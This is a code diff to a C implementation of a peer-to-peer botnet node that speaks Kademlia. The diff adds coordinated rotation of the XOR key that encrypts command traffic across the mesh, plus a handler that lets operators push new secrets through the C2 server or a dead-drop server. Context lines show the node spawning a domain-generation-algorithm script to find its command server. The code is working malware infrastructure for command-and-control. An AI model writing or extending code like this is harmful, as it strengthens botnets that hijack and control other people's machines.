@@ -211,15 +211,33 @@ static void seed_random(void) {
 }
 
 /* XOR stream cipher — matches p2p_node.py _simple_encrypt/_simple_decrypt */
-static uint8_t g_key_hash[SHA256_DIGEST_LENGTH];
-static pthread_once_t g_key_once = PTHREAD_ONCE_INIT;
+static uint8_t          g_key_hash[SHA256_DIGEST_LENGTH];
+static pthread_once_t   g_key_once = PTHREAD_ONCE_INIT;
+static pthread_rwlock_t g_key_rwlock = PTHREAD_RWLOCK_INITIALIZER;
+
 static void init_key_hash(void) {
     SHA256((const uint8_t *)P2P_SECRET, strlen(P2P_SECRET), g_key_hash);
 }
+
+/* Rotate the XOR keystream used for all P2P wire messages.
+ * Called when an update_secret command is received so that the entire mesh
+ * can adopt a new session key in one coordinated poll cycle.
+ * Thread-safe: takes a write lock so in-flight send/recv finish first.     */
+static void rotate_p2p_key(const char *new_secret) {
+    pthread_once(&g_key_once, init_key_hash);   /* ensure initialized first */
+    uint8_t new_hash[SHA256_DIGEST_LENGTH];
+    SHA256((const uint8_t *)new_secret, strlen(new_secret), new_hash);
+    pthread_rwlock_wrlock(&g_key_rwlock);
+    memcpy(g_key_hash, new_hash, SHA256_DIGEST_LENGTH);
+    pthread_rwlock_unlock(&g_key_rwlock);
+}
+
 static void xor_cipher(const uint8_t *in, uint8_t *out, size_t len) {
     pthread_once(&g_key_once, init_key_hash);
+    pthread_rwlock_rdlock(&g_key_rwlock);
     for (size_t i = 0; i < len; i++)
         out[i] = in[i] ^ g_key_hash[i % SHA256_DIGEST_LENGTH];
+    pthread_rwlock_unlock(&g_key_rwlock);
 }
 
 /* SHA-1 of a NUL-terminated string → NodeID */
@@ -1450,7 +1468,27 @@ static void execute_command(KademliaNode *n, const char *cmd_json) {
          */
         printf("[P2P] -> Triggering DGA C2 search (spawning dga.py)\n");
         system("python3 dga.py &");
- 
+
+    /* ── P2P mesh key rotation ───────────────────────────────────────────
+     * An operator calls POST /push_key on the dead-drop server (Phase 2) or
+     * POST /rotate_key on the C2 server (Phase 1).  Both queue an
+     * update_secret task that propagates through the DHT just like any
+     * other command.  Every node that receives it calls rotate_p2p_key()
+     * so that the entire surviving mesh switches to the new XOR keystream
+     * on the same poll cycle.  Nodes that are offline at rotation time will
+     * be unable to decrypt future traffic until they resync — this is
+     * intentional and mirrors real key-rotation eviction semantics.        */
+    } else if (strcmp(type, "update_secret") == 0) {
+        char new_secret[64] = {0};
+        json_str(cmd_json, "secret", new_secret, sizeof(new_secret));
+        if (strlen(new_secret) >= 8) {
+            rotate_p2p_key(new_secret);
+            printf("[P2P] -> P2P mesh key rotated. New keystream: %02x%02x%02x%02x...\n",
+                   g_key_hash[0], g_key_hash[1], g_key_hash[2], g_key_hash[3]);
+        } else {
+            printf("[P2P] -> update_secret ignored: secret must be >=8 chars\n");
+        }
+
     } else {
         printf("[P2P] -> Unknown command type: %s\n", type);
     }
